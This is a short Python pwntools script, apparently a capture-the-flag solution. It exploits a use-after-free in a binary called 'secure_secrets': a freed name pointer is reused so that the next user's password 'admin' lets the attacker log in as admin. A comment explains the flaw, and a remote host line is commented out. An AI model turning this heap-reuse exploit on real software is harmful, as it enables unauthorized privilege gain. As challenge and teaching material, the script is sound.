
from pwn import *

if __name__ == "__main__":
	p = process('./secure_secrets')
	#p = remote('159.89.166.12', 12000)
	"""
	Used after free
	when the program delete the User they free(name) but it doesn't put the pointer to NULL

	free(list[0]->name);
	list[0]->name // still pointing to the chunk...

	So if we allocate a same chunk we should have control over the pointer to name
	We create a user with password as 'admin'

	list[1]->name = strdup("test");
	list[1]->password = strdup("admin"); //this chunk is pointing to same address as list[0]->name

	So list[0]->name is pointing to an address containing 'admin' !!!

	"""


	"""
	Create a User
	"""
	print(p.recvrepeat(1))
	p.sendline('1')
	print(p.recvrepeat(1))
	p.sendline("dummy")
	print(p.recvrepeat(1))
	p.sendline("pwn")

	"""
	Log in as the User
	"""
	print(p.recvrepeat(1))
	p.sendline('2')
	print(p.recvrepeat(1))
	p.sendline('dummy')
	print(p.recvrepeat(1))
	p.sendline('pwn')
	
	"""
	Delete the current User
	"""
	print(p.recvrepeat(1))
	p.sendline('3')

	"""
	Create a user with admin as password
	"""
	print(p.recvrepeat(1))
	p.sendline('1')
	print(p.recvrepeat(1))
	p.sendline('test')
	print(p.recvrepeat(1))
	p.sendline('admin')

	"""
	Login as admin
	"""
	print(p.recvrepeat(1))
	p.sendline('2')
	print(p.recvrepeat(1))
	p.sendline('admin')
	print(p.recvrepeat(1))
	p.sendline('pwn')

	print(p.recvrepeat(1))


